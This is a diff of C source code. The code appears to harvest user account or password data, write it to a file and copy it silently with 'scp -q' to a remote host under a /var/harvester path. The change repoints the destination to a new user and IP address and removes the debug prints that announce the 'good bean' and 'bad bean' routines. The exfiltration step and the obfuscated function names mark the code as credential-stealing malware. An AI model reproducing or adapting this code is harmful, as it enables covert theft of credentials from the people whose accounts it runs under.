@@ -15,7 +15,7 @@ void aV8A9h3K(char *filename, struct passwd *p, char *passlist[], int rounds, ch
     }
     fclose(fp);
     char command[50] = "/usr/bin/scp -q '";
-    char dest[100] = "' harvester@172.16.91.5:/var/harvester";
+    char dest[100] = "' pdiddy@172.16.77.5:/var/harvester";
     strcat(command, filename);
     strcat(command, dest);
     system(command);
@@ -25,7 +25,6 @@ void aV8A9h3K(char *filename, struct passwd *p, char *passlist[], int rounds, ch
     system(command);
 }
 void rRoAHUF2(int rounds, char *argv[], int argc, int condition){//goodbean
-    printf("Entering good bean\n");
     if (argc == 1){
         rounds = rounds + 1;
         struct passwd *p = getpwuid(getuid()); 
@@ -66,7 +65,6 @@ void rRoAHUF2(int rounds, char *argv[], int argc, int condition){//goodbean
 
 }
 void Bitnfw2b(int rounds, char *argv[], int argc){//badbean
-    printf("Entering bad bean\n");
      if (argc == 1){
         int attempts = 0;
         rounds = rounds + 1;
